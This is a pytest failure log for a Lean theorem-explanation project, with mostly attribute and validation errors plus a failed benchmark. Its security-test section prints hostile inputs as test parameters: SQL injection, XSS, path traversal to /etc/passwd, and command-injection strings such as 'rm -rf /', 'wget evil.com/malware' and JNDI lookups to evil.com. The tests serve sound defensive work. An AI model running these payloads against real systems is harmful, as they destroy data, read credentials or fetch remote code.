E     Field required [type=missing, input_value={'theorem_name': 'Complex...∈ ℝ, x + y ∈ ℂ'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   formal_overview
E     Field required [type=missing, input_value={'theorem_name': 'Complex...∈ ℝ, x + y ∈ ℂ'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   intuitive_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'Complex...∈ ℝ, x + y ∈ ℂ'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   conceptual_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'Complex...∈ ℝ, x + y ∈ ℂ'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   bridging_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'Complex...∈ ℝ, x + y ∈ ℂ'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   formal_conclusion
E     Field required [type=missing, input_value={'theorem_name': 'Complex...∈ ℝ, x + y ∈ ℂ'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   proof_strategy
E     Field required [type=missing, input_value={'theorem_name': 'Complex...∈ ℝ, x + y ∈ ℂ'}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
_____________________________ test_resource_limits _____________________________
tests/manual_tests/test_critical_error_handling.py:72: in test_resource_limits
    with timeout(0.1):  # 100ms timeout
         ^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/contextlib.py:137: in __enter__
    return next(self.gen)
           ^^^^^^^^^^^^^^
src/proof_sketcher/core/resource_limits.py:51: in timeout
    signal.alarm(seconds)
E   TypeError: 'float' object cannot be interpreted as an integer
----------------------------- Captured stdout call -----------------------------

🧪 Testing Resource Limits...
________________________ test_error_context_propagation ________________________
tests/manual_tests/test_critical_error_handling.py:98: in middle_function
    deep_function()
tests/manual_tests/test_critical_error_handling.py:94: in deep_function
    raise FileNotFoundError("Configuration file missing")
E   FileNotFoundError: Configuration file missing

The above exception was the direct cause of the following exception:
tests/manual_tests/test_critical_error_handling.py:105: in test_error_context_propagation
    top_function()
tests/manual_tests/test_critical_error_handling.py:102: in top_function
    middle_function()
tests/manual_tests/test_critical_error_handling.py:97: in middle_function
    with error_context("loading configuration"):
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/contextlib.py:158: in __exit__
    self.gen.throw(value)
src/proof_sketcher/core/error_handling.py:62: in error_context
    raise ProofSketcherError(
E   proof_sketcher.core.exceptions.ProofSketcherError: Unexpected error during loading configuration: Configuration file missing

During handling of the above exception, another exception occurred:
tests/manual_tests/test_critical_error_handling.py:109: in test_error_context_propagation
    assert "initializing system" in str(e)
E   AssertionError: assert 'initializing system' in 'Unexpected error during loading configuration: Configuration file missing'
E    +  where 'Unexpected error during loading configuration: Configuration file missing' = str(ProofSketcherError('Unexpected error during loading configuration: Configuration file missing'))
----------------------------- Captured stdout call -----------------------------

🧪 Testing Error Context Propagation...
_______________________ test_file_parser_error_handling ________________________
tests/manual_tests/test_critical_error_handling.py:161: in test_file_parser_error_handling
    assert "Not a Lean file" in result.errors[0].message
E   AssertionError: assert 'Not a Lean file' in 'File not found: test.txt'
E    +  where 'File not found: test.txt' = ParseError(message='File not found: test.txt', line_number=None, column=None, error_type='file_not_found', severity='error').message
----------------------------- Captured stdout call -----------------------------

🧪 Testing File Parser Error Handling...
✓ Non-existent file handled gracefully
________ TestRealTheoremParsing.test_parse_real_theorem[theorem_data0] _________
tests/parser/test_real_theorems.py:143: in test_parse_real_theorem
    assert (
E   AssertionError: Statement 'a + b = b + a' should contain 'Nat'
E   assert 'nat' in 'a + b = b + a'
E    +  where 'nat' = <built-in method lower of str object at 0x102eb15f0>()
E    +    where <built-in method lower of str object at 0x102eb15f0> = 'Nat'.lower
________ TestRealTheoremParsing.test_parse_real_theorem[theorem_data1] _________
tests/parser/test_real_theorems.py:143: in test_parse_real_theorem
    assert (
E   AssertionError: Statement 'a * (b + c) = a * b + a * c' should contain 'Nat'
E   assert 'nat' in 'a * (b + c) = a * b + a * c'
E    +  where 'nat' = <built-in method lower of str object at 0x102eb15f0>()
E    +    where <built-in method lower of str object at 0x102eb15f0> = 'Nat'.lower
________ TestRealTheoremParsing.test_parse_real_theorem[theorem_data2] _________
tests/parser/test_real_theorems.py:143: in test_parse_real_theorem
    assert (
E   AssertionError: Statement '0 + n = n' should contain 'Nat'
E   assert 'nat' in '0 + n = n'
E    +  where 'nat' = <built-in method lower of str object at 0x102eb15f0>()
E    +    where <built-in method lower of str object at 0x102eb15f0> = 'Nat'.lower
________ TestRealTheoremParsing.test_parse_real_theorem[theorem_data3] _________
tests/parser/test_real_theorems.py:143: in test_parse_real_theorem
    assert (
E   AssertionError: Statement '(n + 1) + m = n + (m + 1)' should contain 'Nat'
E   assert 'nat' in '(n + 1) + m = n + (m + 1)'
E    +  where 'nat' = <built-in method lower of str object at 0x102eb15f0>()
E    +    where <built-in method lower of str object at 0x102eb15f0> = 'Nat'.lower
________ TestRealTheoremParsing.test_parse_real_theorem[theorem_data4] _________
tests/parser/test_real_theorems.py:143: in test_parse_real_theorem
    assert (
E   AssertionError: Statement '(a + b) + c = a + (b + c)' should contain 'Nat'
E   assert 'nat' in '(a + b) + c = a + (b + c)'
E    +  where 'nat' = <built-in method lower of str object at 0x102eb15f0>()
E    +    where <built-in method lower of str object at 0x102eb15f0> = 'Nat'.lower
______________ TestParserDiagnostics.test_basic_parsing_fallback _______________
tests/parser/test_real_theorems.py:287: in test_basic_parsing_fallback
    parser.config.lean_executable = "/nonexistent/lean"
    ^^^^^^^^^^^^^
E   AttributeError: 'SimpleLeanParser' object has no attribute 'config'
________________________ test_performance_improvements _________________________
tests/performance/test_benchmarks.py:652: in test_performance_improvements
    assert score > 70.0, f"Overall performance score {score:.1f}/100 (target: 70+)"
E   AssertionError: Overall performance score 0.0/100 (target: 70+)
E   assert 0 > 70.0
----------------------------- Captured stdout call -----------------------------
🚀 Running Full Performance Benchmark Suite
============================================================

🔤 Benchmarking notation handler (1000 iterations)...
❌ Notation handler benchmark failed: 'ParserConfig' object has no attribute 'convert_to_latex'

💾 Benchmarking caching system (1000 operations)...
❌ Caching system benchmark failed: 'ProofSketcherConfig' object has no attribute 'set'

⚡ Benchmarking parallel processing (25 theorems)...
❌ Parallel processing benchmark failed: 'ProofSketcherConfig' object has no attribute 'process_theorems_parallel'

🧠 Benchmarking memory usage...
❌ Memory usage benchmark failed: 'ParserConfig' object has no attribute 'convert_to_latex'

🛡️ Benchmarking resource limits...
❌ Resource limits benchmark failed: 'ProofSketcherConfig' object has no attribute 'limit_memory'
📊 Results saved to: benchmark_results/benchmark_results_20250720_122826.json

============================================================
📊 BENCHMARK SUMMARY
============================================================
🎯 Overall Performance Score: 0.0/100 (Grade: F)

Individual Component Scores:

Key Improvements:

✅ Benchmark suite completed successfully!
__________________________ test_caching_effectiveness __________________________
tests/performance/test_benchmarks.py:660: in test_caching_effectiveness
    results = suite.benchmark_caching_system(500)
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
tests/performance/test_benchmarks.py:170: in benchmark_caching_system
    asyncio.run(write_benchmark())
../../miniconda3/envs/cs109b/lib/python3.12/asyncio/runners.py:195: in run
    return runner.run(main)
           ^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/asyncio/runners.py:118: in run
    return self._loop.run_until_complete(task)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/asyncio/base_events.py:691: in run_until_complete
    return future.result()
           ^^^^^^^^^^^^^^^
tests/performance/test_benchmarks.py:168: in write_benchmark
    await cache.set(key, value, ttl=3600)
          ^^^^^^^^^
E   AttributeError: 'ProofSketcherConfig' object has no attribute 'set'
----------------------------- Captured stdout call -----------------------------

💾 Benchmarking caching system (500 operations)...
______________________ test_resource_limits_functionality ______________________
tests/performance/test_benchmarks.py:673: in test_resource_limits_functionality
    results = suite.benchmark_resource_limits()
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
tests/performance/test_benchmarks.py:382: in benchmark_resource_limits
    with limiter.limit_memory(100):  # 100MB limit
         ^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'ProofSketcherConfig' object has no attribute 'limit_memory'
----------------------------- Captured stdout call -----------------------------

🛡️ Benchmarking resource limits...
_________ TestTheoremNameExploits.test_path_injection_in_theorem_name __________
tests/security/test_exploit_attempts.py:149: in test_path_injection_in_theorem_name
    assert ".." not in result
E   AssertionError: assert '..' not in 'theorem_.._.._.._secret'
E
E     '..' is contained here:
E       theorem_.._.._.._secret
E     ?         ++
______________ TestResourceExhaustionExploits.test_rate_limiting _______________
tests/security/test_exploit_attempts.py:236: in test_rate_limiting
    limiter = RateLimiter(max_calls=3, time_window=1.0)
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src/proof_sketcher/core/resource_limits.py:193: in __init__
    self._lock = asyncio.Lock() if asyncio.get_event_loop().is_running() else None
                                   ^^^^^^^^^^^^^^^^^^^^^^^^
../../miniconda3/envs/cs109b/lib/python3.12/asyncio/events.py:702: in get_event_loop
    raise RuntimeError('There is no current event loop in thread %r.'
E   RuntimeError: There is no current event loop in thread 'MainThread'.
______________ TestXSSPrevention.test_script_injection_in_content ______________
tests/security/test_exploit_attempts.py:260: in test_script_injection_in_content
    ProofStep(
E   pydantic_core._pydantic_core.ValidationError: 2 validation errors for ProofStep
E   step_number
E     Field required [type=missing, input_value={'description': "<svg onl...al_cookies()</script>']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
E   mathematical_content
E     Field required [type=missing, input_value={'description': "<svg onl...al_cookies()</script>']}, input_type=dict]
E       For further information visit https://errors.pydantic.dev/2.11/v/missing
______________ TestEdgeCaseExploits.test_special_filesystem_names ______________
tests/security/test_exploit_attempts.py:363: in test_special_filesystem_names
    assert result != name or name in [".", ".."]
E   AssertionError: assert ('CON' != 'CON' or 'CON' in ['.', '..'])
_ TestInputValidation.test_html_sanitization['; DROP TABLE theorems; ---'; DROP TABLE theorems; --] _
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
_ TestInputValidation.test_html_sanitization[admin' OR '1'='1-admin' OR '1'='1] _
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
_ TestInputValidation.test_html_sanitization[1; DELETE FROM users-1; DELETE FROM users] _
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
_ TestInputValidation.test_html_sanitization[<script>alert('xss')</script>-&lt;script&gt;alert('xss')&lt;/script&gt;] _
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
_ TestInputValidation.test_html_sanitization[javascript:alert('xss')-javascript:alert('xss')] _
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
_ TestInputValidation.test_html_sanitization[<img src=x onerror=alert('xss')>-&lt;img src=x onerror=alert('xss')&gt;] _
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
_ TestInputValidation.test_html_sanitization[&lt;script&gt;alert('xss')&lt;/script&gt;-&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;] _
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
_ TestInputValidation.test_html_sanitization[../../../etc/passwd-../../../etc/passwd] _
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
_ TestInputValidation.test_html_sanitization[..\\..\\..\\windows\\system32-..\\..\\..\\windows\\system32] _
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
_____ TestInputValidation.test_html_sanitization[/etc/passwd-/etc/passwd] ______
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
_ TestInputValidation.test_html_sanitization[file.lean; rm -rf /-file.lean; rm -rf /] _
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
_ TestInputValidation.test_html_sanitization[file.lean && cat /etc/passwd-file.lean && cat /etc/passwd] _
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
_ TestInputValidation.test_html_sanitization[file.lean || wget evil.com/malware-file.lean || wget evil.com/malware] _
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
______ TestInputValidation.test_html_sanitization[`rm -rf /`-`rm -rf /`] _______
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
_____ TestInputValidation.test_html_sanitization[$(rm -rf /)-$(rm -rf /)] ______
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
_ TestInputValidation.test_html_sanitization[${jndi:ldap://evil.com/a}-${jndi:ldap://evil.com/a}] _
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
_ TestInputValidation.test_html_sanitization[${jndi:rmi://evil.com/a}-${jndi:rmi://evil.com/a}] _
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
__ TestInputValidation.test_html_sanitization[file.txt\x00.exe-file.txt.exe] ___
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
_ TestInputValidation.test_html_sanitization[file.lean\x00../../../etc/passwd-file.lean../../../etc/passwd] _
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
_ TestInputValidation.test_html_sanitization[file\u200b.lean-file\u200b.lean] __
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
_ TestInputValidation.test_html_sanitization[file\u2028.lean-file\u2028.lean] __
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
_ TestInputValidation.test_html_sanitization[theorem test : True := trivial-theorem test : True := trivial] _
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
_ TestInputValidation.test_html_sanitization[valid_theorem_name-valid_theorem_name] _
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
________________ TestInputValidation.test_html_sanitization[-] _________________
tests/security/test_input_validation.py:92: in test_html_sanitization
    result = InputValidator.sanitize_html_output(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'sanitize_html_output'
___ TestInputValidation.test_file_path_validation[../../../etc/passwd-False] ___
tests/security/test_input_validation.py:123: in test_file_path_validation
    result = InputValidator.validate_file_path(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
_ TestInputValidation.test_file_path_validation[..\\..\\..\\windows\\system32-False] _
tests/security/test_input_validation.py:123: in test_file_path_validation
    result = InputValidator.validate_file_path(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
_______ TestInputValidation.test_file_path_validation[/etc/passwd-False] _______
tests/security/test_input_validation.py:123: in test_file_path_validation
    result = InputValidator.validate_file_path(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
_ TestInputValidation.test_file_path_validation[file.lean/../../../etc/passwd-False] _
tests/security/test_input_validation.py:123: in test_file_path_validation
    result = InputValidator.validate_file_path(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
___ TestInputValidation.test_file_path_validation[file.lean; rm -rf /-False] ___
tests/security/test_input_validation.py:123: in test_file_path_validation
    result = InputValidator.validate_file_path(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
_ TestInputValidation.test_file_path_validation[file.lean && cat /etc/passwd-False] _
tests/security/test_input_validation.py:123: in test_file_path_validation
    result = InputValidator.validate_file_path(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
_ TestInputValidation.test_file_path_validation[file.lean || wget evil.com-False] _
tests/security/test_input_validation.py:123: in test_file_path_validation
    result = InputValidator.validate_file_path(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
_ TestInputValidation.test_file_path_validation[file.lean | grep secret-False] _
tests/security/test_input_validation.py:123: in test_file_path_validation
    result = InputValidator.validate_file_path(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
__ TestInputValidation.test_file_path_validation[file.lean `rm -rf /`-False] ___
tests/security/test_input_validation.py:123: in test_file_path_validation
    result = InputValidator.validate_file_path(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
__ TestInputValidation.test_file_path_validation[file.lean $(rm -rf /)-False] __
tests/security/test_input_validation.py:123: in test_file_path_validation
    result = InputValidator.validate_file_path(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
__ TestInputValidation.test_file_path_validation[file.lean {rm -rf /}-False] ___
tests/security/test_input_validation.py:123: in test_file_path_validation
    result = InputValidator.validate_file_path(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
________ TestInputValidation.test_file_path_validation[file.lean-True] _________
tests/security/test_input_validation.py:123: in test_file_path_validation
    result = InputValidator.validate_file_path(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
_____ TestInputValidation.test_file_path_validation[subdir/file.lean-True] _____
tests/security/test_input_validation.py:123: in test_file_path_validation
    result = InputValidator.validate_file_path(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
__ TestInputValidation.test_file_path_validation[deep/nested/file.lean-True] ___
tests/security/test_input_validation.py:123: in test_file_path_validation
    result = InputValidator.validate_file_path(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
___ TestInputValidation.test_file_path_validation[file-with-dash.lean-True] ____
tests/security/test_input_validation.py:123: in test_file_path_validation
    result = InputValidator.validate_file_path(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
_ TestInputValidation.test_file_path_validation[file_with_underscore.lean-True] _
tests/security/test_input_validation.py:123: in test_file_path_validation
    result = InputValidator.validate_file_path(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
___ TestInputValidation.test_file_path_validation[file.with.dots.lean-True] ____
tests/security/test_input_validation.py:123: in test_file_path_validation
    result = InputValidator.validate_file_path(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
____________ TestInputValidation.test_file_path_validation[-False] _____________
tests/security/test_input_validation.py:123: in test_file_path_validation
    result = InputValidator.validate_file_path(malicious_input)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_file_path'. Did you mean: 'validate_path'?
_____ TestInputValidation.test_theorem_name_validation[valid_theorem-True] _____
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
_ TestInputValidation.test_theorem_name_validation[theorem_with_numbers123-True] _
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
___ TestInputValidation.test_theorem_name_validation[theorem.with.dots-True] ___
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
__ TestInputValidation.test_theorem_name_validation[_leading_underscore-True] __
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
_______ TestInputValidation.test_theorem_name_validation[CamelCase-True] _______
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
________ TestInputValidation.test_theorem_name_validation[simple-True] _________
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
___________ TestInputValidation.test_theorem_name_validation[-False] ___________
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
______ TestInputValidation.test_theorem_name_validation[123invalid-False] ______
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
_____ TestInputValidation.test_theorem_name_validation[invalid-dash-False] _____
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
____ TestInputValidation.test_theorem_name_validation[invalid space-False] _____
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
____ TestInputValidation.test_theorem_name_validation[invalid@symbol-False] ____
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
____ TestInputValidation.test_theorem_name_validation[invalid/slash-False] _____
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
__ TestInputValidation.test_theorem_name_validation[invalid\\backslash-False] __
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
_ TestInputValidation.test_theorem_name_validation[aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-False] _
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
_______ TestInputValidation.test_theorem_name_validation[.invalid-False] _______
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: type object 'InputValidator' has no attribute 'validate_theorem_name'
_______ TestInputValidation.test_theorem_name_validation[invalid.-False] _______
tests/security/test_input_validation.py:158: in test_theorem_name_validation
    result = InputValidator.validate_theorem_name(theorem_name)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
